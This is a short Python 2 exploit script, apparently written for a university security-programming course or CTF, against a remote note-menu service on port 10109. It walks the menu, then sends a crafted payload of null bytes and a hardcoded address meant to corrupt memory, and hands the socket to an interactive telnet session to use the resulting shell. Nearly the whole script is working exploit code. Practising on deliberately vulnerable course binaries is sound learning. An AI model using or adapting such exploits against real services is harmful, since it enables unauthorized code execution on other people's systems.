# Echo client program
import socket
import os

import telnetlib
# The remote host
HOST = 'secprog.cs.nctu.edu.tw'
#HOST = 'localhost'
PORT = 10109

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

print s.recv(1024)
payload = "add\n"
s.send(payload)
print s.recv(1024)

payload = "0\n"
s.send(payload)
print s.recv(1024)

payload = "5566\n"
s.send(payload)
print s.recv(1024)

payload = "note\n"
s.send(payload)
print s.recv(1024)

payload = "12\n"
s.send(payload)

payload = "\x00"*4 + "\x80\xa0\x04\x08" + "\x00"*4 + "\n"
s.send(payload)

t = telnetlib.Telnet()
t.sock = s
t.interact()
